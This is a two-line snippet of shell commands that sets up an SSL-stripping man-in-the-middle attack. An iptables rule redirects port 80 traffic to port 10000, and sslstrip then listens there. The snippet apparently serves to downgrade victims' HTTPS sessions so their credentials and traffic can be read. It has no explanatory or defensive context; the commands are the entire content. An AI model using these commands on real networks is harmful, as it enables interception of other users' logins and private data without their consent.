iptables -t nat -A PREROUTING  -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sslstrip -l 10000
